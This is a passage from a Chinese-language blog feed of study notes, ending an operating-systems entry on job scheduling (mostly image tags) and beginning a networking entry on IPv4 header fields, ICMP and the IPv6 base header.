id="3-作业调度算法"><a href="#3-作业调度算法" class="headerlink" title="3.作业调度算法"></a>3.作业调度算法</h1><p><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/%E8%A1%A8%E6%A0%BC%E4%BD%9C%E4%B8%9A%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95-1616401508904.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/%E8%A1%A8%E6%A0%BC%E4%BD%9C%E4%B8%9A%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95-1616401508904.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="表格作业调度算法"></p><p><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/%E4%BD%9C%E4%B8%9A%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/%E4%BD%9C%E4%B8%9A%E8%B0%83%E5%BA%A6%E7%AE%97%E6%B3%95.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="作业调度算法"></p><p><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322162800257.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322162800257.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322162800257" style="zoom:67%;"><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322162828150.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322162828150.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322162828150"></p><p><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322162800257.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322162800257.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322162800257" style="zoom:67%;"><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322162828150.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322162828150.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322162828150"></p><p><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163127433.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163127433.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322163127433" style="zoom:67%;"><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163152919.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163152919.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322163152919"></p><p><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163127433.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163127433.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322163127433" style="zoom:67%;"><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163152919.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163152919.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322163152919"><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163223199.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163223199.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322163223199"></p><p><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163127433.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163127433.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322163127433" style="zoom:67%;"><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163152919.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163152919.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322163152919"><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163223199.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163223199.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322163223199"><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163600360.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163600360.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322163600360"></p><p><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163127433.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163127433.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322163127433" style="zoom:67%;"><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163152919.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163152919.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322163152919"><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163223199.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163223199.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322163223199"><img src="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163600360.png" class="lazyload" data-srcset="/2021/03/21/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/2.%E5%A4%84%E7%90%86%E6%9C%BA%E8%B0%83%E5%BA%A6/image-20210322163600360.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210322163600360"></p><h1 id="4-进程调度"><a href="#4-进程调度" class="headerlink" title="4.进程调度"></a>4.进程调度</h1>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 操作系统 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络</title>
      <link href="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h1><h2 id="IP数据报"><a href="#IP数据报" class="headerlink" title="IP数据报"></a>IP数据报</h2><h6 id="1-IP数据报格式"><a href="#1-IP数据报格式" class="headerlink" title="1.IP数据报格式"></a>1.IP数据报格式</h6><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528134046521.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528134046521.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528134046521" style="zoom:67%;"><p>IP数据报由<strong>首部</strong>和<strong>数据</strong>两部分组成。</p><p><strong>1.首部组成：</strong></p><ul><li><p><strong>固定部分</strong>：20字节</p></li><li><p><strong>可选字段</strong>：最多40字节，每4字节加一次，不满4个字节填充</p></li></ul><p><strong>2.固定部分中的各字段：</strong></p><ul><li><p><strong>版本</strong>：4bit；IP协议版本号为4（IPV4）</p></li><li><p><strong>首部长度</strong>：4bit；IP首部的固定长度为20字节，即最小值为5（每4个字节+1），4bit表示最大数为15，所以IP首部可选长度为10*4=40字节，IP首部最大为60个字节</p></li><li><p><strong>总长度</strong>：16bit；总长度指首部和数据之和的长度，单位为字节。总长度字段为16位，2^16^-1=65535字节</p></li><li><p><strong>标识：</strong>16bit；IP软件再存储器中维持一个计数器，每产生一个数据报，计数器+1，并将值赋给表示字段。当数据长度超过MTU必须分片，这个表示字段的值就被复制到所有的数据报片的标识字段，<strong>相同的标识字段的值使用分片后的各数据报片最后能正确地重装成原来的数据报</strong>。</p></li><li><p><strong>标志(flag)：</strong>3bit；只有两位有意义</p><p>最低位MF：MF=1表示后面还有分片的数据报；MF=0表示这已是若干数据报片中的最后一个</p><p>中间位DF：DF=1表示“不能分片”；只有当DF=0才允序分片</p></li><li><p><strong>片偏移：</strong>13bit；较长的分组在分片后，某片在原分组中的相对位置；片偏移以8个字节为偏移单位，每个分片的长度一定是8个字节(64位)的整数倍，也就是首位序号的偏移。</p></li></ul><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528145708819.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528145708819.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528145708819" style="zoom:50%;"><ul><li><p><strong>生存时间：</strong>8bit，TTL（TIME TO LIVE）目前TTL字段功能改为“跳转限制”，路由器在每次转发数据报之前就把TTL值-1，若TTL值减少到0，就丢弃这个数据报，不再转发，TTL的单位是<strong>跳数</strong></p></li><li><p><strong>协议</strong>：8bit；代表数据报使用的是何种协议，以便使目的主机的IP层知道应将数据部分上交给哪个协议进行处理</p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528150338902.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528150338902.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528150338902" style="zoom: 67%;"></li><li><p><strong>首部检验和</strong>：16bit；这个字段只检验数据报的首部，不包括数据部分</p></li><li><p><strong>源地址：</strong>32bit；</p></li><li><p><strong>目的地址</strong>：32bit</p></li></ul><p><strong>3.IP数据报首部的可变部分</strong></p><p>增加首部的可变部分是为了增加IP数据报的功能，使得IP数据报的首部长度成为可变。</p><h2 id="网际控制报文协议ICMP"><a href="#网际控制报文协议ICMP" class="headerlink" title="网际控制报文协议ICMP"></a>网际控制报文协议ICMP</h2><p>ICMP（Internet Control Message Protocol）是互联网的标准协议，ICMP报文作为IP层数据报的数据，加上数据报的首部，组成IP数据报发送。</p><p>ICMP报文格式：</p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528151457031.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528151457031.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528151457031" style="zoom:67%;"><p>ICMP的代码字段是为了进一步区分某种类型中的不同情况，检验和字段用来检验整个ICMP报文；IP数据报首部的检验和并不检验IP的内部内容，因此不能保证经过传输的ICMP报文不产生出错。</p><h6 id="1-ICMP报文种类：ICMP差错报告报文和ICMP询问报文"><a href="#1-ICMP报文种类：ICMP差错报告报文和ICMP询问报文" class="headerlink" title="1.ICMP报文种类：ICMP差错报告报文和ICMP询问报文"></a>1.ICMP报文种类：ICMP差错报告报文和ICMP询问报文</h6><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528162420000.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528162420000.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528162420000" style="zoom:67%;"><h6 id="2-数据部分"><a href="#2-数据部分" class="headerlink" title="2.数据部分"></a>2.数据部分</h6><p>所有ICMP差错报告报文中的数据字段都具有相格式，把收到需要差错报告的<strong>IP数据报的首部</strong>和<strong>数据字段</strong>的前8个字节提取出来，作为ICMP报文的数据字段，再加上相应的ICMP差错报告报文的前8个字节，就构成了ICMP差错报告报文。</p><p>提取到的数据报的数据字段前8个字节是为了得到运输层的端口号(TCP和UDP)以及运输层报文的发送序号对于(TCP)</p><p>整个ICMP报文作为数据报的数据字段发送给源点。</p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528164652865.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528164652865.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528164652865" style="zoom: 80%;"><h6 id="3-ICMP的应用举例"><a href="#3-ICMP的应用举例" class="headerlink" title="3.ICMP的应用举例"></a>3.ICMP的应用举例</h6><p>PING和TRACEROUTE</p><h2 id="IPV6"><a href="#IPV6" class="headerlink" title="IPV6"></a>IPV6</h2><p>IPV6数据报由两部分组成，基本首部（base header）和有效载荷（payload）</p><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528191515066.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528191515066.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528191515066" style="zoom:67%;"><p>有效载荷也称为净负荷，<strong>有效载荷</strong>允许有零个或多个扩展首部，再后面是数据部分，但注意，所有的扩展首部并不属于IPV6数据报的首部。</p><h6 id="1-基本首部"><a href="#1-基本首部" class="headerlink" title="1.基本首部"></a>1.基本首部</h6><img src="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528191855864.png" class="lazyload" data-srcset="/2021/03/20/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/image-20210528191855864.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image-20210528191855864" 